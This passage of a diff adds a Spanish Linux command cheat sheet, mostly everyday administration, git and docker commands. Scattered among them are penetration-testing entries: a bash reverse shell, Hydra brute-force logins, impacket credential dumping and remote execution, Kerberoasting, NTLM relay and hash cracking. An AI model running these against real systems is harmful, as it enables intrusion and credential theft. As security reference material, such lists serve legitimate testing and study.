@@ -1,0 +1,1392 @@
+#################################################################
+#                             LINUX                             #
+#################################################################
+
+!!    # Repetir último comando
+!$    # Último argumento del comando anterior
+!*    # Todos los argumentos del comando anterior
+!comando    # Ejecutar último comando que empiece con 'comando'
+!n    # Ejecutar comando número n del historial
+Alt-#    # Comentar línea actual
+$(comando)    # Sustitución de comando (moderna)
+(comando1; comando2)    # Ejecutar en subshell
+Alt-*    # Insertar todas las completaciones
+. archivo    # Equivalente a source
+./configure    # Configurar compilación
+./configure --prefix=/usr/local    # Configurar con prefijo
+./script.sh    # Ejecutar script con shebang
+Alt-.    # Insertar último argumento del comando anterior
+/usr/bin/script -qc /bin/bash /dev/null    # Otra forma de PTY
+> archivo.txt    # Vaciar archivo (truncar)
+Alt-?    # Listar completaciones posibles
+Ctrl-[    # Escape
+Ctrl-\\    # Enviar SIGQUIT (dump core)
+Ctrl-] x    # Mover cursor al siguiente 'x'
+^error^correcto    # Reemplazar en último comando y ejecutar
+`comando`    # Sustitución de comando (antigua)
+{ comando1; comando2; }    # Ejecutar en shell actual
+7z a -p archivo.7z archivos    # Crear 7z encriptado
+7z a archivo.7z archivos    # Crear 7z
+7z l archivo.7z    # Listar 7z
+7z x archivo.7z    # Extraer 7z
+add-apt-repository ppa:user/ppa    # Añadir PPA
+addr2line -e binario dirección    # Convertir dirección a línea de código
+alias    # Listar alias definidos
+alias ll='ls -l'    # Crear alias
+amap host puerto    # Identificar servicios
+ansible host -a "comando"    # Ejecutar comando con Ansible
+ansible host -m ping    # Ping a host con Ansible
+ansible-playbook playbook.yml    # Ejecutar playbook
+ansible-vault create secrets.yml    # Crear vault
+ansible-vault edit secrets.yml    # Editar vault
+aplay archivo.wav    # Reproducir audio
+apt autoremove    # Eliminar dependencias huérfanas
+apt full-upgrade    # Actualización completa
+apt install paquete    # Instalar paquete
+apt list --installed    # Listar instalados
+apt purge paquete    # Eliminar paquete y configuración
+apt remove paquete    # Eliminar paquete
+apt search palabra    # Buscar paquete
+apt show paquete    # Mostrar información
+apt update    # Actualizar lista de paquetes
+apt upgrade    # Actualizar paquetes instalados
+apt-cache policy paquete    # Ver política de versiones
+apt-cache search palabra    # Buscar en caché
+apt-cache show paquete    # Mostrar detalles
+apt-file search archivo    # Buscar paquete que provee archivo
+apt-file update    # Actualizar base de apt-file
+apt-get dist-upgrade    # Actualización de distribución
+apt-get install paquete    # Instalar (legacy)
+apt-get update    # Actualizar lista (legacy)
+apt-mark hold paquete    # Retener paquete
+apt-mark unhold paquete    # Liberar paquete
+ar r libfoo.a archivo.o    # Crear biblioteca estática
+ar t libfoo.a    # Listar contenido de biblioteca estática
+arp -a    # Mostrar tabla ARP (legacy)
+asciiquarium    # Acuario ASCII
+atop    # Monitor avanzado de recursos
+atq    # Listar trabajos programados con at
+atrm ID    # Eliminar trabajo at
+atrm n    # Eliminar trabajo programado número n
+awk 'END{print NR}' archivo    # Contar líneas totales
+awk '{gsub(/foo/, "bar"); print}' archivo    # Reemplazar con awk
+aws configure    # Configurar AWS CLI
+aws ec2 describe-instances    # Listar instancias EC2
+aws s3 ls    # Listar buckets S3
+az group list    # Listar grupos de recursos
+az login    # Login en Azure
+az vm list    # Listar VMs
+Ctrl-A    # Ir al inicio de línea
+badblocks -sv /dev/sda    # Buscar bloques defectuosos
+base64 -d archivo.b64    # Decodificar Base64
+base64 archivo    # Codificar a Base64
+bash    # Iniciar nuevo bash
+bash -c "comando"    # Ejecutar comando en bash
+bash -i >& /dev/tcp/host/puerto 0>&1    # Reverse shell bash
+bash script.sh    # Ejecutar script en bash
+batch    # Ejecutar comando cuando carga baje
+bb    # Demostración ASCII art
+bc    # Calculadora interactiva
+bg    # Reanudar trabajo suspendido en segundo plano
+bg %1    # Reanudar trabajo número 1 en segundo plano
+binwalk -e archivo    # Extraer contenido
+binwalk archivo    # Análisis de firmware/binarios
+blkid    # Mostrar UUID de particiones
+bloodhound    # Iniciar GUI BloodHound
+bloodhound-python -c All -u admin -p pass -d domain -ns host    # Recolección BloodHound
+bootchart    # Generar gráfico de arranque
+brew doctor    # Diagnosticar problemas
+brew info formula    # Información
+brew install formula    # Instalar fórmula (macOS/Linux)
+brew list    # Listar instalados
+brew search palabra    # Buscar
+brew services start formula    # Iniciar servicio
+brew services stop formula    # Detener servicio
+brew tap user/repo    # Añadir tap
+brew uninstall formula    # Desinstalar fórmula
+brew update    # Actualizar Homebrew
+brew upgrade    # Actualizar fórmulas
+bunzip2 -c archivo.bz2    # Mostrar contenido de bzip2
+bunzip2 archivo.bz2    # Descomprimir bzip2
+byobu    # Iniciar Byobu (envoltorio tmux/screen)
+byobu new-session -d -n ventana "comando"    # Crear sesión byobu
+byobu-disable    # Deshabilitar Byobu
+byobu-enable    # Habilitar Byobu por defecto
+bzip2 archivo    # Comprimir con bzip2
+Alt-B    # Mover palabra hacia atrás
+Ctrl-B    # Mover cursor hacia atrás
+c++filt _ZN...    # Demangle símbolo C++
+cachegrind ./binario    # Perfil de caché
+cal    # Mostrar calendario
+cal -3    # Mostrar mes anterior, actual y siguiente
+cal -y    # Calendario del año
+cal 02 2024    # Calendario específico
+cargo build    # Compilar proyecto Rust
+cargo install paquete    # Instalar paquete Rust
+cargo run    # Ejecutar proyecto Rust
+cargo test    # Ejecutar tests
+cat -n archivo    # Mostrar contenido con números de línea
+cat /etc/crontab    # Mostrar tareas cron del sistema
+cat /etc/fstab    # Tabla de filesystems
+cat /etc/hosts    # Resolución de nombres local
+cat /etc/os-release    # Información de distribución (moderno)
+cat /etc/resolv.conf    # Configuración DNS
+cat /etc/shells    # Listar shells disponibles
+cat /proc/cmdline    # Parámetros de arranque
+cat /proc/cpuinfo    # Información detallada de CPU
+cat /proc/filesystems    # Filesystems soportados
+cat /proc/loadavg    # Promedio de carga
+cat /proc/meminfo    # Información detallada de memoria
+cat /proc/mounts    # Puntos de montaje activos
+cat /proc/net/dev    # Estadísticas de interfaces
+cat /proc/version    # Versión del kernel
+cat > archivo.txt    # Redirigir stdin a archivo (sobrescribir)
+cat >> archivo.txt    # Redirigir stdin a archivo (append)
+cat archivo    # Mostrar contenido de archivo
+cat archivo | fzf    # Seleccionar línea interactivamente
+cat archivo | grep patron    # Pipeline clásico (anti-patrón útil)
+cat archivo | sort | uniq    # Eliminar todos los duplicados
+cat archivo | sort | uniq -c | sort -rn    # Contar frecuencias ordenadas
+cat archivo1 archivo2    # Concatenar archivos
+cd -    # Ir al directorio anterior
+cd ..    # Subir un nivel
+cd /    # Ir al directorio raíz
+cd dir    # Cambiar a directorio
+cd ~    # Ir al directorio home
+cewl http://host -w wordlist.txt    # Generar wordlist desde web
+cgroups-lite comando    # Ejecutar con control groups (conceptual)
+checksec --file=binario    # Verificar seguridad de binario
+chgrp group archivo    # Cambiar grupo
+chkconfig servicio off    # Deshabilitar servicio (RedHat)
+chkconfig servicio on    # Habilitar servicio (RedHat)
+chmod +x script.sh    # Hacer ejecutable
+chmod -R 755 dir    # Cambiar permisos recursivamente
+chmod 755 archivo    # Cambiar permisos en octal
+chmod go-w archivo    # Quitar escritura a grupo y otros
+chmod u+x archivo    # Añadir permiso de ejecución al usuario
+chown -R user dir    # Cambiar propietario recursivamente
+chown user archivo    # Cambiar propietario
+chown user:group archivo    # Cambiar propietario y grupo
+chronyc sources    # Ver fuentes NTP (chrony)
+chronyc tracking    # Estado de sincronización
+chroot /mnt /bin/bash    # Cambiar root directory
+chrpath -r '/lib' binario    # Cambiar rpath
+chsh -s /bin/bash    # Cambiar shell por defecto
+cksum archivo    # CRC checksum
+clear    # Limpiar pantalla
+cmake .    # Configurar con CMake
+cmatrix    # Efecto Matrix en terminal
+cmp archivo1 archivo2    # Comparar archivos byte a byte
+column -s',' -t archivo    # Formatear CSV en columnas
+column -t archivo    # Formatear en columnas
+comando &    # Ejecutar comando en background
+comando &> todo.log    # Redirigir stdout y stderr a archivo
+comando 2> error.log    # Redirigir stderr a archivo
+comando 2>&1 | less    # Redirigir stderr a stdout y paginar
+comando < archivo.txt    # Redirigir archivo como stdin
+comando <(archivo)    # Process substitution entrada
+comando << EOF    # Here-document
+comando <<< "texto"    # Here-string
+comando > archivo.txt    # Redirigir stdout a archivo (sobrescribir)
+comando > archivo.txt 2>&1    # Redirigir stderr a stdout luego a archivo
+comando >(archivo)    # Process substitution salida
+comando >> archivo.txt    # Redirigir stdout a archivo (append)
+comando1 $(comando2)    # Anidar sustitución de comando
+comando1 & comando2    # Ejecutar 1 en background, luego 2
+comando1 && comando2    # Ejecutar 2 si 1 tuvo éxito
+comando1 ; comando2    # Ejecutar 1 y luego 2
+comando1 | comando2    # Pipe: salida de 1 a entrada de 2
+comando1 |& comando2    # Pipe con stderr incluido (bash)
+comando1 || comando2    # Ejecutar 2 si 1 falló
+comm -12 archivo1 archivo2    # Líneas comunes a ambos
+comm archivo1 archivo2    # Comparar archivos ordenados línea a línea
+compgen -c    # Listar todos los comandos disponibles
+compgen -f    # Listar archivos para completación
+complete -p    # Mostrar completaciones definidas
+convert entrada.jpg -resize 50% salida.jpg    # Redimensionar
+convert entrada.jpg salida.png    # Convertir imagen (ImageMagick)
+cowsay "hola"    # Vaca diciendo hola
+cp -a origen destino    # Copiar preservando atributos
+cp -i origen destino    # Copiar con confirmación
+cp -r origen destino    # Copiar recursivamente
+cp -v origen destino    # Copiar verboso
+cp origen destino    # Copiar archivo
+cpio -idv < archivo.cpio    # Extraer cpio
+cppcheck --enable=all src    # Análisis estático C++
+crackmapexec smb host -u admin -p pass    # Enumerar SMB
+crontab -e    # Editar tareas cron del usuario
+crontab -l    # Listar tareas cron del usuario
+crontab -l | grep backup    # Buscar en crontab
+crontab -r    # Eliminar tareas cron del usuario
+crontab archivo    # Instalar archivo como crontab
+crunch 8 12 abc123 -o wordlist.txt    # Generar wordlist
+cryptsetup close secure    # Cerrar volumen LUKS
+cryptsetup luksFormat /dev/sdb    # Formatear con LUKS
+cryptsetup open /dev/sdb secure    # Abrir volumen LUKS
+csh    # Iniciar csh
+csplit archivo '/regex/'    # Dividir archivo por patrón
+csplit archivo 10 20    # Dividir en líneas 10 y 20
+cupp -i    # Generar wordlist personalizada
+curl --insecure url    # Ignorar verificación SSL
+curl -H 'Header: valor' url    # Enviar header personalizado
+curl -I url    # Mostrar solo headers
+curl -k url    # Ignorar verificación SSL
+curl -L url    # Seguir redirecciones
+curl -o archivo url    # Descargar archivo con nombre específico
+curl -O url    # Descargar archivo conservando nombre
+curl -u user:pass url    # Autenticación básica
+curl -v url    # Modo verbose
+curl -X POST -d 'datos' url    # Enviar POST
+curl url    # Descargar contenido de URL
+cut --complement -f1 archivo    # Extraer todo excepto campo 1
+cut -c1-10 archivo    # Extraer caracteres 1-10
+cut -d':' -f1 archivo    # Extraer primera columna
+cut -f1,3 archivo    # Extraer campos 1 y 3
+Alt-C    # Cambiar directorio con fzf
+Ctrl-C    # Enviar SIGINT al proceso en primer plano
+dash script.sh    # Ejecutar en dash (sh ligero)
+date    # Mostrar fecha y hora
+date +"%Y-%m-%d"    # Mostrar fecha en formato personalizado
+date +%s    # Timestamp Unix
+date --date="next monday"    # Fecha relativa
+date -d "yesterday"    # Mostrar fecha de ayer
+date -d @1700000000    # Convertir timestamp
+date -u    # Fecha UTC
+dc    # Calculadora de notación polaca inversa
+dd if=/dev/sda of=backup.img bs=4M    # Clonar disco
+dd if=/dev/urandom of=archivo bs=1K count=1    # Datos aleatorios
+dd if=/dev/zero of=archivo bs=1M count=100    # Crear archivo de 100MB
+dd if=origen of=destino bs=1M    # Copiar bloques
+deactivate    # Desactivar entorno virtual
+df    # Mostrar uso de disco
+df -h    # Mostrar uso de disco en formato humano
+df -hT    # Mostrar filesystems y tipos
+df -i    # Mostrar inodos libres
+df -T    # Mostrar tipo de filesystem
+diff -r dir1 dir2    # Comparar directorios recursivamente
+diff -u archivo1 archivo2    # Diferencias en formato unificado
+diff -y archivo1 archivo2    # Diferencias lado a lado
+diff archivo1 archivo2    # Diferencias entre archivos
+dig +short dominio    # Consulta DNS corta
+dig -x IP    # Consulta DNS inversa
+dig dominio    # Consultar DNS
+dig dominio MX    # Consultar registros MX
+dig dominio NS    # Consultar registros NS
+dirb http://host    # Fuerza bruta de directorios
+dirs    # Mostrar pila de directorios
+disown    # Desvincular último trabajo del shell
+disown -a    # Desvincular todos los trabajos
+dmesg    # Mostrar mensajes del kernel
+dmesg -T    # Mostrar mensajes con timestamps humanos
+dmesg | tail    # Mostrar últimos mensajes del kernel
+dmidecode    # Volcar tabla DMI
+dmidecode -t memory    # Información de memoria
+dmidecode -t processor    # Información de procesador
+dnf autoremove    # Eliminar huérfanos
+dnf clean all    # Limpiar caché
+dnf info paquete    # Información
+dnf install paquete    # Instalar paquete (Fedora)
+dnf list installed    # Listar instalados
+dnf remove paquete    # Eliminar paquete
+dnf repolist    # Listar repos
+dnf search palabra    # Buscar
+dnf update    # Actualizar
+dnf upgrade    # Actualizar todo
+docker attach contenedor    # Adjuntar a contenedor en ejecución
+docker build -t nombre .    # Construir imagen desde Dockerfile
+docker context ls    # Listar contexts
+docker context use contexto    # Cambiar contexto
+docker cp . contenedor:/ruta    # Copiar hacia contenedor
+docker cp contenedor:/ruta .    # Copiar desde contenedor
+docker diff contenedor    # Ver cambios en filesystem
+docker exec -it contenedor bash    # Ejecutar shell en contenedor
+docker exec contenedor comando    # Ejecutar comando en contenedor
+docker export -o cont.tar contenedor    # Exportar filesystem
+docker history imagen    # Historial de capas
+docker images    # Listar imágenes
+docker images -q    # Listar solo IDs de imágenes
+docker import cont.tar    # Importar como imagen
+docker info    # Información del daemon
+docker inspect --format='{{.NetworkSettings.IPAddress}}' contenedor    # Campo específico
+docker inspect contenedor    # Información JSON del contenedor
+docker kill contenedor    # Forzar detención
+docker load -i imagen.tar    # Cargar imagen desde tar
+docker login    # Iniciar sesión en registry
+docker logout    # Cerrar sesión
+docker logs --tail 100 contenedor    # Últimas 100 líneas
+docker logs -f contenedor    # Seguir logs
+docker logs contenedor    # Ver logs
+docker network inspect red    # Inspeccionar red
+docker network ls    # Listar redes
+docker pause contenedor    # Pausar contenedor
+docker port contenedor    # Ver mapeo de puertos
+docker ps    # Listar contenedores activos
+docker ps -a    # Listar todos los contenedores
+docker ps -q    # Listar solo IDs
+docker pull imagen    # Descargar imagen
+docker push repo/imagen    # Subir imagen
+docker restart contenedor    # Reiniciar contenedor
+docker rm $(docker ps -aq)    # Eliminar todos los contenedores
+docker rm contenedor    # Eliminar contenedor
+docker rmi $(docker images -q)    # Eliminar todas las imágenes
+docker rmi imagen    # Eliminar imagen
+docker run --name miapp imagen    # Nombrar contenedor
+docker run --rm imagen    # Eliminar al terminar
+docker run -d imagen    # Ejecutar en background
+docker run -it imagen bash    # Ejecutar interactivo con shell
+docker run -p 8080:80 imagen    # Mapear puerto
+docker run -v /host:/contenedor imagen    # Montar volumen
+docker run imagen    # Ejecutar contenedor
+docker save -o imagen.tar imagen    # Guardar imagen a tar
+docker search imagen    # Buscar en Docker Hub
+docker start contenedor    # Iniciar contenedor
+docker stats    # Estadísticas de recursos
+docker stop contenedor    # Detener contenedor
+docker system df    # Uso de disco
+docker system prune    # Limpiar recursos no usados
+docker tag origen destino    # Etiquetar imagen
+docker top contenedor    # Procesos del contenedor
+docker unpause contenedor    # Reanudar contenedor
+docker update --cpus=2 contenedor    # Actualizar recursos
+docker version    # Versión
+docker volume create nombre    # Crear volumen
+docker volume ls    # Listar volúmenes
+docker volume rm nombre    # Eliminar volumen
+docker wait contenedor    # Esperar a que termine
+docker-compose build    # Construir servicios
+docker-compose config    # Validar y mostrar configuración
+docker-compose down    # Detener y eliminar
+docker-compose exec servicio comando    # Ejecutar en servicio
+docker-compose logs    # Ver logs
+docker-compose ps    # Listar servicios
+docker-compose pull    # Descargar imágenes
+docker-compose restart    # Reiniciar servicios
+docker-compose up    # Levantar servicios
+docker-compose up -d    # Levantar en background
+dpkg -i paquete.deb    # Instalar paquete .deb
+dpkg -l    # Listar paquetes instalados
+dpkg -L paquete    # Listar archivos de paquete
+dpkg -r paquete    # Eliminar paquete
+dpkg -S archivo    # Buscar paquete que contiene archivo
+dpkg-reconfigure paquete    # Reconfigurar paquete
+du    # Mostrar uso de disco de archivos
+du -ah dir    # Mostrar todo con tamaños humanos
+du -h    # Mostrar uso en formato humano
+du -sh dir    # Mostrar total de directorio
+dumpe2fs /dev/sda1    # Volcar información de ext4
+Alt-D    # Borrar palabra hacia adelante
+Ctrl-D    # Enviar EOF (cerrar stdin)
+e2fsck -f /dev/sda1    # Forzar verificación
+e2fsck /dev/sda1    # Verificar filesystem ext4
+echo "1+1" | bc    # Calcular en pipeline
+echo "scale=2; 10/3" | bc    # División con decimales
+echo "texto"    # Imprimir texto
+echo $HOME    # Mostrar HOME
+echo $PATH    # Mostrar PATH
+echo $USER    # Mostrar USER
+echo $VAR    # Imprimir variable
+echo -e "linea1\nlinea2"    # Interpretar escapes
+echo -n "texto"    # Sin salto de línea
+egrep patron archivo    # Equivalente a grep -E
+emacs -nw archivo    # Emacs en terminal
+emacs archivo    # Editar con Emacs
+enum4linux -a host    # Enumeración SMB completa
+env    # Mostrar variables de entorno
+env python3 script.py    # Ejecutar con intérprete específico
+env VAR=valor comando    # Ejecutar con variable temporal
+espeak "Hola"    # Síntesis de voz
+ethtool -s eth0 speed 1000 duplex full    # Configurar interfaz
+ethtool eth0    # Mostrar estadísticas de interfaz
+exec comando    # Reemplazar shell con comando
+exiftool archivo    # Metadatos
+exit    # Salir del shell
+expand -t 4 archivo    # Expandir tabs a 4 espacios
+export TERM=xterm    # Configurar TERM
+export VAR=valor    # Exportar variable
+expr 1 + 1    # Evaluar expresión
+expr 10 \* 5    # Multiplicar (escapar asterisco)
+Ctrl-E    # Ir al fin de línea
+factor 100    # Factorizar número
+faillog    # Registro de logins fallidos
+fdisk -l    # Listar particiones
+fdisk /dev/sda    # Editar tabla de particiones (MBR)
+festival --tts < archivo    # Leer archivo en voz alta
+ffmpeg -i entrada -ss 00:01:00 -t 10 -c copy recorte.mp4    # Cortar video
+ffmpeg -i entrada -vf "scale=640:-1" salida.mp4    # Redimensionar
+ffmpeg -i entrada salida.mp4    # Convertir video/audio
+ffmpeg -i video.mp4 -vcodec copy -an video_sin_audio.mp4    # Eliminar audio
+ffmpeg -i video.mp4 -vn -acodec copy audio.aac    # Extraer audio
+ffplay archivo.mp4    # Reproducir video con FFmpeg
+ffuf -u http://host/FUZZ -w wordlist.txt    # FFUF fuzzing
+fg    # Traer último trabajo a primer plano
+fg %1    # Traer trabajo número 1 a primer plano
+fgrep patron archivo    # Equivalente a grep -F (fijo)
+figlet TEXTO    # Arte ASCII de texto
+file -i archivo    # Identificar tipo MIME
+file binario    # Identificar tipo de archivo
+find . -exec comando {} \;    # Ejecutar comando en cada resultado
+find . -maxdepth N    # Limitar profundidad de búsqueda
+find . -name '*.log' -mtime +7    # Buscar archivos modificados hace más de 7 días
+find . -name '*.old' -delete    # Buscar y eliminar directamente
+find . -name '*.py' | xargs rm    # Buscar y eliminar archivos .py
+find . -name '*.txt'    # Buscar archivos por nombre
+find . -perm 644    # Buscar archivos con permisos específicos
+find . -size +100M    # Buscar archivos mayores a 100MB
+find . -type d    # Buscar solo directorios
+find . -type f    # Buscar solo archivos
+find . -type f | fzf    # Seleccionar archivo
+findmnt    # Mostrar árbol de montajes
+finger user    # Mostrar información de usuario
+firewall-cmd --add-service=ssh --permanent    # Permitir servicio
+firewall-cmd --list-all    # Listar reglas de firewalld
+firewall-cmd --reload    # Recargar firewalld
+fish    # Iniciar fish
+flatpak install app    # Instalar flatpak
+flatpak list    # Listar flatpaks
+flatpak uninstall app    # Eliminar flatpak
+flatpak update    # Actualizar flatpaks
+fmt -w 80 archivo    # Formatear a ancho de 80
+fold -w 80 archivo    # Cortar líneas a 80 caracteres
+fortune    # Mostrar cita aleatoria
+free    # Mostrar uso de memoria
+free -h    # Mostrar uso de memoria en formato humano
+free -m    # Mostrar uso de memoria en megabytes
+fsck /dev/sda1    # Verificar filesystem genérico
+fuser -k 80/tcp    # Matar procesos en puerto 80
+fuser -km /mnt    # Matar procesos usando punto de montaje
+fuser -v archivo    # Procesos usando archivo
+fzf    # Fuzzy finder interactivo
+Alt-F    # Mover palabra hacia adelante
+Ctrl-F    # Mover cursor hacia adelante
+gawk '/pattern/ {print}' archivo    # Filtrar por patrón
+gawk 'BEGIN {print "Inicio"}' archivo    # Bloque BEGIN
+gawk 'NR==10' archivo    # Imprimir línea 10
+gawk 'NR>10 && NR<20' archivo    # Líneas 11-19
+gawk '{print $1, $3}' archivo    # Imprimir columnas 1 y 3
+gawk '{print $1}' archivo    # Imprimir primera columna
+gawk '{print $NF}' archivo    # Imprimir última columna
+gawk '{print length}' archivo    # Longitud de cada línea
+gawk '{sum+=$1} END {print sum}' archivo    # Sumar columna
+gawk -F':' '{print $1}' archivo    # Usar separador :
+gawk -v var=valor '{print var}' archivo    # Pasar variable
+gcloud auth login    # Login en GCP
+gcloud compute instances list    # Listar instancias
+gcloud config set project ID    # Establecer proyecto
+gdb -batch -ex "bt" -p PID    # Obtener backtrace automáticamente
+gdb -p PID    # Adjuntar GDB a proceso
+gdb ./programa    # Depurar con GDB
+gdisk /dev/sda    # Editar tabla de particiones (GPT)
+gem install paquete    # Instalar gema Ruby
+gem list    # Listar
+gem uninstall paquete    # Desinstalar
+getent group group    # Información de grupo NSS
+getent hosts host    # Información de host NSS
+getent passwd user    # Información de usuario NSS
+GetNPUsers.py domain/ -usersfile users.txt -dc-ip host    # AS-REP Roasting
+GetUserSPNs.py domain/admin:pass -dc-ip host    # Kerberoasting
+git add -p    # Añadir interactivamente por parches
+git add .    # Añadir todos los cambios
+git add archivo    # Añadir archivo al staging
+git archive --format=tar HEAD > repo.tar    # Exportar como tar
+git bisect bad    # Marcar commit como malo
+git bisect good commit    # Marcar commit como bueno
+git bisect start    # Iniciar búsqueda binaria
+git blame -L 10,20 archivo    # Ver autor de líneas 10-20
+git blame archivo    # Ver autor de cada línea
+git branch    # Listar ramas
+git branch -d nombre    # Eliminar rama
+git branch -m nuevo_nombre    # Renombrar rama
+git branch nombre    # Crear rama
+git bundle create repo.bundle --all    # Crear bundle
+git bundle unbundle repo.bundle    # Desempaquetar bundle
+git checkout -- archivo    # Descartar cambios en archivo
+git checkout -b nombre    # Crear y cambiar a rama
+git checkout commit -- archivo    # Restaurar archivo de commit
+git checkout nombre    # Cambiar de rama
+git cherry-pick commit    # Aplicar commit específico
+git clean -fd    # Eliminar archivos no rastreados
+git clone url    # Clonar repositorio
+git commit -a -m "mensaje"    # Confirmar todos los cambios modificados
+git commit -m "mensaje"    # Confirmar cambios
+git config --global alias.co checkout    # Crear alias
+git config --global core.editor vim    # Configurar editor
+git config --global user.email "email"    # Configurar email
+git config --global user.name "Nombre"    # Configurar nombre
+git config --list    # Listar configuración
+git describe --tags    # Describir commit con tag más cercano
+git diff    # Ver cambios no confirmados
+git diff --cached    # Ver cambios en staging
+git diff HEAD~1    # Ver cambios respecto a commit anterior
+git fetch    # Descargar cambios del remoto
+git fetch --all    # Descargar de todos los remotos
+git fetch --tags    # Descargar tags
+git fsck    # Verificar integridad
+git gc    # Recolector de basura
+git grep patron    # Buscar en el repositorio
+git init    # Inicializar repositorio
+git instaweb --start    # Iniciar servidor web visualizador
+git log    # Ver historial
+git log --author="nombre"    # Filtrar por autor
+git log --graph --oneline --all    # Historial gráfico de todas las ramas
+git log --oneline    # Historial resumido
+git log --since="1 week ago"    # Filtrar por fecha
+git log --stat    # Ver estadísticas por commit
+git log -p -2    # Ver patch de últimos 2 commits
+git merge --abort    # Abortar fusión
+git merge nombre    # Fusionar rama
+git pull    # Descargar e integrar cambios
+git pull --rebase    # Descargar y rebasesar
+git push    # Subir cambios
+git push --tags    # Subir tags
+git push -u origin rama    # Subir y establecer upstream
+git push origin --delete rama    # Eliminar rama remota
+git rebase -i HEAD~3    # Rebase interactivo
+git rebase nombre    # Rebasear rama
+git reflog    # Ver historial de referencias
+git remote -v    # Ver repositorios remotos
+git remote add origin url    # Añadir remoto
+git remote remove origin    # Eliminar remoto
+git remote rename old new    # Renombrar remoto
+git reset --hard HEAD~1    # Deshacer último commit y cambios
+git reset --soft HEAD~1    # Deshacer último commit manteniendo cambios
+git reset HEAD archivo    # Quitar archivo del staging
+git restore archivo    # Restaurar archivo a estado del índice (moderno)
+git revert commit    # Crear commit que revierte otro
+git show --stat commit    # Ver estadísticas de commit
+git show commit    # Ver detalle de commit
+git stash    # Guardar cambios temporalmente
+git stash apply    # Aplicar stash sin eliminar
+git stash drop    # Eliminar último stash
+git stash list    # Listar stashes
+git stash pop    # Restaurar último stash
+git status    # Ver estado del repositorio
+git submodule update --init    # Inicializar submódulos
+git submodule update --recursive    # Actualizar recursivamente
+git switch rama    # Cambiar a rama (moderno, seguro)
+git tag -a nombre -m "msg"    # Crear tag anotado
+git tag -d nombre    # Eliminar tag
+git tag nombre    # Crear tag
+git update-server-info    # Actualizar info para servidor dumb
+git worktree add ../rama-nueva rama    # Crear worktree
+gobuster dir -u http://host -w wordlist.txt    # Gobuster directorios
+gobuster dns -d dominio -w wordlist.txt    # Fuerza bruta DNS
+gpg --batch --passphrase pass --symmetric archivo    # Encriptar sin interacción
+gpg --decrypt archivo.gpg    # Desencriptar
+gpg --encrypt -r ID archivo    # Encriptar para destinatario
+gpg --export -a ID > pub.asc    # Exportar clave pública ASCII
+gpg --gen-key    # Generar par de claves
+gpg --import pub.asc    # Importar clave pública
+gpg --list-keys    # Listar claves públicas
+gpg --list-secret-keys    # Listar claves privadas
+gpg --sign archivo    # Firmar archivo
+gpg --verify archivo.sig archivo    # Verificar firma
+gpg -c archivo    # Encriptar archivo simétricamente
+gpg -d backup.tar.gz.gpg | tar xzvf -    # Desencriptar y extraer
+gpg archivo.gpg    # Desencriptar archivo
+gpg2john privada.asc > hash.txt    # Preparar clave GPG para John
+grep --color=auto patron archivo    # Resaltar coincidencias en color
+grep -c patron archivo    # Contar coincidencias
+grep -E 'patron1|patron2' archivo    # Expresiones regulares extendidas
+grep -H patron archivo    # Mostrar nombre de archivo en resultados
+grep -i patron archivo    # Buscar ignorando mayúsculas
+grep -l patron dir/*    # Mostrar solo nombres de archivo con coincidencias
+grep -n patron archivo    # Mostrar números de línea
+grep -o patron archivo    # Extraer solo la coincidencia (only-matching)
+grep -r patron dir    # Buscar recursivamente
+grep -v patron archivo    # Invertir coincidencias
+grep -w patron archivo    # Buscar palabra completa
+grep patron archivo    # Buscar patrón en archivo
+groupadd group    # Crear grupo
+groupdel group    # Eliminar grupo
+groups    # Mostrar grupos del usuario
+groups user    # Mostrar grupos de otro usuario
+grub-mkconfig -o /boot/grub/grub.cfg    # Generar configuración GRUB
+gunzip archivo.gz    # Descomprimir archivo
+gvim archivo    # Vim gráfico
+gzip -9 archivo    # Máxima compresión
+gzip -d archivo.gz    # Descomprimir
+gzip archivo    # Comprimir archivo
+Ctrl-G    # Cancelar búsqueda en historial
+halt    # Detener CPU
+hash    # Mostrar comandos hasheados
+hash -r    # Limpiar hash de comandos
+hashcat --example-hashes    # Ver ejemplos de hashes
+hashcat -m 0 hash.txt pass.txt    # Crack con Hashcat
+hashcat -m 1000 hash.txt pass.txt    # NTLM crack
+hdparm -I /dev/sda    # Información de disco
+hdparm -tT /dev/sda    # Test de velocidad de disco
+head -n 20 archivo    # Mostrar primeras 20 líneas
+head archivo    # Mostrar primeras 10 líneas
+helm delete nombre    # Eliminar release
+helm install nombre chart    # Instalar chart
+helm list    # Listar releases
+helm upgrade nombre chart    # Actualizar release
+hexdump -C archivo    # Volcar en hexadecimal y ASCII
+history    # Mostrar historial de comandos
+history -c    # Limpiar historial
+host dominio    # Consultar DNS simple
+hostname    # Mostrar nombre del host
+hostname -I    # Mostrar direcciones IP
+hostnamectl    # Mostrar/establecer información del host
+htop    # Monitor de procesos mejorado
+hwclock    # Reloj de hardware
+hwclock --hctosys    # Sincronizar hardware a sistema
+hwclock --systohc    # Sincronizar sistema a hardware
+hydra -l admin -P pass.txt host http-post-form "/login:username=^USER^&password=^PASS^:Invalid"    # Fuerza bruta HTTP
+hydra -l admin -P pass.txt ssh://host    # Fuerza bruta SSH
+id    # Mostrar ID de usuario y grupo
+id -g    # GID numérico
+id -Gn    # Nombres de grupos
+id -u    # UID numérico
+id user    # Mostrar ID de otro usuario
+identify imagen.jpg    # Información de imagen
+ifconfig    # Mostrar interfaces (legacy)
+ifconfig eth0    # Mostrar interfaz específica (legacy)
+ifconfig eth0 192.168.1.1    # Asignar IP (legacy)
+ifconfig eth0 up    # Levantar interfaz (legacy)
+impacket-ntlmrelayx -tf targets.txt    # NTLM Relay
+impacket-psexec admin:pass@host    # Ejecutar remoto PSEXEC
+impacket-secretsdump domain/admin@host    # Extraer secrets Windows
+impacket-smbexec admin:pass@host    # Ejecutar remoto SMB
+impacket-wmiexec admin:pass@host    # Ejecutar remoto WMI
+info comando    # Mostrar documentación info
+init 0    # Apagar (SysV)
+init 6    # Reiniciar (SysV)
+initctl list    # Listar trabajos Upstart
+insmod ruta/modulo.ko    # Insertar módulo manualmente
+ionice -c 2 -n 0 comando    # Ejecutar con mejor prioridad de I/O
+iostat -x 1    # Estadísticas extendidas de I/O
+iostat 1    # Mostrar estadísticas de I/O cada segundo
+iotop    # Monitor de I/O por proceso
+ip addr    # Mostrar direcciones IP
+ip addr show dev eth0    # Mostrar IP de interfaz específica
+ip link    # Mostrar interfaces de red
+ip link set eth0 down    # Bajar interfaz
+ip link set eth0 up    # Levantar interfaz
+ip neigh    # Mostrar tabla ARP
+ip route    # Mostrar tabla de rutas
+ip route add default via gateway    # Añadir ruta por defecto
+iptables -A INPUT -j DROP    # Descartar todo lo demás
